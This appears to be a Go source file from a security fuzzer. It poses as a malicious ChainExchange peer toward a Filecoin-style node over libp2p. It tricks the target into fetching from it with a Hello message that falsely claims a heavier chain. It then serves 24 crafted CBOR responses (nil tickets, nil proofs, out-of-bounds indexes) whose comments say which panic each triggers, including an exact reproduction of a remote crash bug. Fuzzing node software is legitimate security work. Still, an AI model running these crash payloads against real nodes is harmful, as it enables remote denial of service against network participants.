package main

import (
	"context"
	"io"
	"log"
	"time"

	"github.com/ipfs/go-cid"
	"github.com/libp2p/go-libp2p/core/host"
	"github.com/libp2p/go-libp2p/core/network"
	"github.com/libp2p/go-libp2p/core/peer"
)

// ---------------------------------------------------------------------------
// ChainExchange Server Attacks (21 mutations)
//
// Pattern: Fuzzer acts as a malicious ChainExchange server.
// 1. Create fresh host, register malicious exchange handler
// 2. Register minimal Hello handler (respond to victim's Hello)
// 3. Connect to target, send Hello claiming heavier chain
// 4. Victim calls FetchTipSet → opens ChainExchange to us
// 5. Our handler responds with mutated data → potential crash
// ---------------------------------------------------------------------------

// responseMutation defines a single server-side attack.
type responseMutation struct {
	id      string
	builder func() []byte // returns the full CBOR Response bytes
}

// getAllExchangeServerAttacks returns all ChainExchange server attack vectors.
func getAllExchangeServerAttacks() []namedAttack {
	mutations := []responseMutation{
		{"R01-nil-ticket", respNilTicket},
		{"R02-nil-election-proof", respNilElectionProof},
		{"R03-nil-bls-aggregate", respNilBLSAggregate},
		{"R04-nil-block-sig", respNilBlockSig},
		{"R05-nil-beacon-entries", respNilBeaconEntries},
		{"R06-empty-beacon-entries", respEmptyBeaconEntries},
		{"R07-nil-block-in-array", respNilBlockInArray},
		{"R08-nil-bls-message", respNilBlsMessage},
		{"R09-nil-secpk-message", respNilSecpkMessage},
		{"R10-nil-secpk-signature", respNilSecpkSignature},
		{"R11-oob-bls-index", respOOBBlsIndex},
		{"R12-oob-secpk-index", respOOBSecpkIndex},
		{"R13-nil-compacted-msgs", respNilCompactedMsgs},
		{"R14-empty-chain-ok", respEmptyChainOk},
		{"R15-duplicate-blocks", respDuplicateBlocks},
		{"R16-unknown-status", respUnknownStatus},
		{"R17-mismatched-includes", respMismatchedIncludes},
		{"R18-more-tipsets-than-req", respMoreTipsetsThanReq},
		{"R19-nil-parents", respNilParents},
		{"R20-empty-parents", respEmptyParents},
		{"R21-all-nil-fields", respAllNilFields},
		// Multi-block tipset attacks — these require 2+ blocks with shared
		// parents/height to trigger sort paths in NewTipSet().
		{"R22-nil-ticket-multiblock", respNilTicketMultiBlock},
		{"R23-both-nil-tickets", respBothNilTickets},
		{"R24-nil-electionproof-multiblock", respNilElectionProofMultiBlock},
	}

	result := make([]namedAttack, len(mutations))
	for i, m := range mutations {
		m := m // capture
		result[i] = namedAttack{
			name: m.id,
			fn: func() {
				target := rngChoice(targets)
				runExchangeServerAttack(ctx, target, m)
			},
		}
	}
	return result
}

// runExchangeServerAttack executes a single server-side attack.
func runExchangeServerAttack(ctx context.Context, target TargetNode, mut responseMutation) {
	// Fresh host for each server attack (needs unique identity for Hello)
	h, err := pool.GetFresh(ctx)
	if err != nil {
		log.Printf("[%s] create host failed: %v", mut.id, err)
		return
	}
	defer h.Close()

	served := make(chan struct{}, 1)

	// Register malicious ChainExchange handler
	h.SetStreamHandler(exchangeProtocol, func(s network.Stream) {
		defer s.Close()
		// Read and discard the request
		io.Copy(io.Discard, io.LimitReader(s, 64*1024))
		// Respond with mutated data
		resp := mut.builder()
		s.Write(resp)
		select {
		case served <- struct{}{}:
		default:
		}
	})

	// Register minimal Hello handler (victim sends us Hello on connect)
	h.SetStreamHandler(helloProtocol, func(s network.Stream) {
		io.Copy(io.Discard, io.LimitReader(s, 64*1024))
		// Respond with minimal LatencyMessage [TArrival=0, TSent=0]
		s.Write(cborArray(cborInt64(0), cborInt64(0)))
		s.Close()
	})

	// Connect to target
	connectCtx, cancel := context.WithTimeout(ctx, 10*time.Second)
	defer cancel()
	if err := h.Connect(connectCtx, target.AddrInfo); err != nil {
		debugLog("[%s] connect failed: %v", mut.id, err)
		return
	}

	// Send Hello claiming heavier chain → victim will fetch from us
	sendTriggerHello(ctx, h, target.AddrInfo.ID)

	// Wait for our handler to be called (or timeout)
	select {
	case <-served:
		debugLog("[%s] malicious response served to %s", mut.id, target.Name)
	case <-time.After(15 * time.Second):
		debugLog("[%s] timeout waiting for victim fetch from %s", mut.id, target.Name)
	}
}

// sendTriggerHello sends a Hello message to the target claiming a heavier
// chain. This triggers the victim to call FetchTipSet → ChainExchange to us.
func sendTriggerHello(ctx context.Context, h host.Host, targetPeer peer.ID) {
	streamCtx, cancel := context.WithTimeout(ctx, 10*time.Second)
	defer cancel()

	s, err := h.NewStream(streamCtx, targetPeer, helloProtocol)
	if err != nil {
		debugLog("[trigger-hello] stream open failed: %v", err)
		return
	}
	defer s.Close()

	genesis := parseGenesisCID()

	// Claim a tipset with random CID at high height with large weight
	payload := buildHelloMessage(
		[]cid.Cid{randomCID()},
		100000,        // high height
		999999999,     // large weight
		genesis,
	)
	s.Write(payload)
	s.CloseWrite()

	// Read and discard the LatencyMessage response
	io.Copy(io.Discard, io.LimitReader(s, 1024))
}

// ---------------------------------------------------------------------------
// Response mutation builders — each returns complete CBOR Response bytes
// ---------------------------------------------------------------------------

// validBlockCBOR returns a structurally valid BlockHeader for use in responses.
func validBlockCBOR() []byte {
	return buildBlockHeaderCBOR(blockHeaderOpts{})
}

// validBSTipSetCBOR returns a valid BSTipSet with one block and empty messages.
func validBSTipSetCBOR() []byte {
	return buildBSTipSetCBOR(
		[][]byte{validBlockCBOR()},
		buildEmptyCompactedMsgsCBOR(),
	)
}

// okResponse wraps a chain of BSTipSets into a status=0 (Ok) Response.
func okResponse(chain ...[]byte) []byte {
	return buildResponseCBOR(0, "", chain)
}

// R1: Block with Ticket = nil → Ticket.Less() panics on sort
func respNilTicket() []byte {
	blk := buildBlockHeaderCBOR(blockHeaderOpts{nilTicket: true})
	ts := buildBSTipSetCBOR([][]byte{blk}, buildEmptyCompactedMsgsCBOR())
	return okResponse(ts)
}

// R2: Block with ElectionProof = nil → WinCount access panics
func respNilElectionProof() []byte {
	blk := buildBlockHeaderCBOR(blockHeaderOpts{nilElectionProof: true})
	ts := buildBSTipSetCBOR([][]byte{blk}, buildEmptyCompactedMsgsCBOR())
	return okResponse(ts)
}

// R3: Block with BLSAggregate = nil → aggregate verification panics
func respNilBLSAggregate() []byte {
	blk := buildBlockHeaderCBOR(blockHeaderOpts{nilBLSAggregate: true})
	ts := buildBSTipSetCBOR([][]byte{blk}, buildEmptyCompactedMsgsCBOR())
	return okResponse(ts)
}

// R4: Block with BlockSig = nil → signature verification panics
func respNilBlockSig() []byte {
	blk := buildBlockHeaderCBOR(blockHeaderOpts{nilBlockSig: true})
	ts := buildBSTipSetCBOR([][]byte{blk}, buildEmptyCompactedMsgsCBOR())
	return okResponse(ts)
}

// R5: Block with BeaconEntries = nil
func respNilBeaconEntries() []byte {
	blk := buildBlockHeaderCBOR(blockHeaderOpts{nilBeaconEntries: true})
	ts := buildBSTipSetCBOR([][]byte{blk}, buildEmptyCompactedMsgsCBOR())
	return okResponse(ts)
}

// R6: Block with BeaconEntries = [] (empty array)
func respEmptyBeaconEntries() []byte {
	// Default blockHeaderOpts already uses empty beacon entries
	blk := validBlockCBOR()
	ts := buildBSTipSetCBOR([][]byte{blk}, buildEmptyCompactedMsgsCBOR())
	return okResponse(ts)
}

// R7: BSTipSet.Blocks contains a nil entry
func respNilBlockInArray() []byte {
	ts := buildBSTipSetCBOR([][]byte{cborNil()}, buildEmptyCompactedMsgsCBOR())
	return okResponse(ts)
}

// R8: CompactedMessages.Bls contains nil → .Cid() on nil panics (Bug 2)
func respNilBlsMessage() []byte {
	blk := validBlockCBOR()
	ts := buildBSTipSetCBOR([][]byte{blk}, buildNilBlsCompactedMsgsCBOR())
	return okResponse(ts)
}

// R9: CompactedMessages.Secpk contains nil → .Cid() on nil panics (Bug 2 variant)
func respNilSecpkMessage() []byte {
	blk := validBlockCBOR()
	ts := buildBSTipSetCBOR([][]byte{blk}, buildNilSecpkCompactedMsgsCBOR())
	return okResponse(ts)
}

// R10: Secpk message with zero-value Signature
func respNilSecpkSignature() []byte {
	// Build a minimal SignedMessage with zero signature
	// SignedMessage = [Message, Signature]
	// Message = [Version, To, From, Nonce, Value, GasLimit, GasFeeCap, GasPremium, Method, Params]
	// Use zero-address (f0) for To/From
	zeroAddr := cborBytes([]byte{0x00, 0x00}) // f00 address
	minMessage := cborArray(
		cborUint64(0),       // Version
		zeroAddr,            // To
		zeroAddr,            // From
		cborUint64(0),       // Nonce
		cborBytes([]byte{}), // Value (BigInt empty = 0)
		cborInt64(1000000),  // GasLimit
		cborBytes(bigIntBytes(100000)), // GasFeeCap
		cborBytes(bigIntBytes(1000)),   // GasPremium
		cborUint64(0),       // Method
		cborBytes([]byte{}), // Params
	)
	// Signature with type=0 (invalid) and empty data
	zeroSig := cborArray(cborUint64(0), cborBytes([]byte{}))
	signedMsg := cborArray(minMessage, zeroSig)

	msgs := cborArray(
		cborArray(),                                  // Bls: []
		cborArray(cborArray()),                       // BlsIncludes: [[]]
		cborArray(signedMsg),                         // Secpk: [signedMsg]
		cborArray(cborArray(cborUint64(0))),           // SecpkIncludes: [[0]]
	)

	blk := validBlockCBOR()
	ts := buildBSTipSetCBOR([][]byte{blk}, msgs)
	return okResponse(ts)
}

// R11: BlsIncludes with out-of-bounds index
func respOOBBlsIndex() []byte {
	blk := validBlockCBOR()
	ts := buildBSTipSetCBOR([][]byte{blk}, buildOOBBlsIndexMsgsCBOR())
	return okResponse(ts)
}

// R12: SecpkIncludes with out-of-bounds index
func respOOBSecpkIndex() []byte {
	blk := validBlockCBOR()
	ts := buildBSTipSetCBOR([][]byte{blk}, buildOOBSecpkIndexMsgsCBOR())
	return okResponse(ts)
}

// R13: BSTipSet.Messages = null
func respNilCompactedMsgs() []byte {
	blk := validBlockCBOR()
	ts := buildBSTipSetCBOR([][]byte{blk}, cborNil())
	return okResponse(ts)
}

// R14: Status=Ok but Chain is empty
func respEmptyChainOk() []byte {
	return buildResponseCBOR(0, "", nil)
}

// R15: Same block twice in Blocks[] → NewTipSet sort with identical tickets
func respDuplicateBlocks() []byte {
	blk := validBlockCBOR()
	ts := buildBSTipSetCBOR(
		[][]byte{blk, blk},
		buildEmptyCompactedMsgsCBOR(),
	)
	return okResponse(ts)
}

// R16: Unknown status code 999
func respUnknownStatus() []byte {
	return buildResponseCBOR(999, "unknown error", [][]byte{validBSTipSetCBOR()})
}

// R17: Mismatched includes length (3 entries for 1 block)
func respMismatchedIncludes() []byte {
	blk := validBlockCBOR()
	ts := buildBSTipSetCBOR([][]byte{blk}, buildMismatchedIncludesMsgsCBOR())
	return okResponse(ts)
}

// R18: More tipsets than requested (3 when typically 1)
func respMoreTipsetsThanReq() []byte {
	return okResponse(validBSTipSetCBOR(), validBSTipSetCBOR(), validBSTipSetCBOR())
}

// R19: Block with Parents = null
func respNilParents() []byte {
	blk := buildBlockHeaderCBOR(blockHeaderOpts{nilParents: true})
	ts := buildBSTipSetCBOR([][]byte{blk}, buildEmptyCompactedMsgsCBOR())
	return okResponse(ts)
}

// R20: Block with Parents = [] (empty)
func respEmptyParents() []byte {
	blk := buildBlockHeaderCBOR(blockHeaderOpts{emptyParents: true})
	ts := buildBSTipSetCBOR([][]byte{blk}, buildEmptyCompactedMsgsCBOR())
	return okResponse(ts)
}

// R21: Every pointer field nil simultaneously
func respAllNilFields() []byte {
	blk := buildBlockHeaderCBOR(blockHeaderOpts{allNil: true})
	ts := buildBSTipSetCBOR([][]byte{blk}, buildEmptyCompactedMsgsCBOR())
	return okResponse(ts)
}

// ---------------------------------------------------------------------------
// Multi-block tipset attacks (Bug 1 exact reproduction)
//
// NewTipSet() only sorts when len(blocks) >= 2. The sort calls Ticket.Less()
// which dereferences the Ticket pointer without nil check → panic.
// Both blocks must share Parents + Height to form a valid tipset.
// ---------------------------------------------------------------------------

// buildMultiBlockMsgsCBOR returns CompactedMessages for a 2-block tipset.
func buildMultiBlockMsgsCBOR() []byte {
	return cborArray(
		cborArray(),                            // Bls: []
		cborArray(cborArray(), cborArray()),     // BlsIncludes: [[], []] — one per block
		cborArray(),                            // Secpk: []
		cborArray(cborArray(), cborArray()),     // SecpkIncludes: [[], []]
	)
}

// R22: Two blocks in tipset, one with nil Ticket → NewTipSet sort → Ticket.Less(nil) → panic
// This is the exact reproduction of Bug 1 (nil-ticket remote crash).
func respNilTicketMultiBlock() []byte {
	shared := newSharedBlockCIDs()

	// Block A: valid ticket, miner f01000
	blkA := buildBlockHeaderCBOR(blockHeaderOpts{
		overrideCIDs:  shared,
		overrideMiner: []byte{0x00, 0xe8, 0x07}, // f01000
	})
	// Block B: nil ticket, different miner f01001 (distinct CID)
	blkB := buildBlockHeaderCBOR(blockHeaderOpts{
		nilTicket:     true,
		overrideCIDs:  shared,
		overrideMiner: []byte{0x00, 0xe9, 0x07}, // f01001
	})

	ts := buildBSTipSetCBOR([][]byte{blkA, blkB}, buildMultiBlockMsgsCBOR())
	return okResponse(ts)
}

// R23: Two blocks both with nil Ticket → sort comparison between two nils → panic
func respBothNilTickets() []byte {
	shared := newSharedBlockCIDs()

	blkA := buildBlockHeaderCBOR(blockHeaderOpts{
		nilTicket:     true,
		overrideCIDs:  shared,
		overrideMiner: []byte{0x00, 0xe8, 0x07},
	})
	blkB := buildBlockHeaderCBOR(blockHeaderOpts{
		nilTicket:     true,
		overrideCIDs:  shared,
		overrideMiner: []byte{0x00, 0xe9, 0x07},
	})

	ts := buildBSTipSetCBOR([][]byte{blkA, blkB}, buildMultiBlockMsgsCBOR())
	return okResponse(ts)
}

// R24: Two blocks, one with nil ElectionProof → WinCount access panic on comparison
func respNilElectionProofMultiBlock() []byte {
	shared := newSharedBlockCIDs()

	blkA := buildBlockHeaderCBOR(blockHeaderOpts{
		overrideCIDs:  shared,
		overrideMiner: []byte{0x00, 0xe8, 0x07},
	})
	blkB := buildBlockHeaderCBOR(blockHeaderOpts{
		nilElectionProof: true,
		overrideCIDs:     shared,
		overrideMiner:    []byte{0x00, 0xe9, 0x07},
	})

	ts := buildBSTipSetCBOR([][]byte{blkA, blkB}, buildMultiBlockMsgsCBOR())
	return okResponse(ts)
}
